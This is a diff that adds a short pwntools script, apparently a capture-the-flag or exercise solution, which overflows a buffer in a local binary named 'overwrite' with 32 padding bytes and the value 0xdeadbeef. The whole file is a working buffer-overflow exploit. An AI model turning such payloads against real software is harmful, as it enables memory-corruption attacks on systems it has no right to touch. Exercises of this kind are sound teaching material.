@@ -1,0 +1,10 @@
+from pwn import *
+
+# Start program
+io = process('./overwrite')
+
+# Send string to overflow buffer
+io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))
+
+# Receive output
+print(io.recvall().decode())
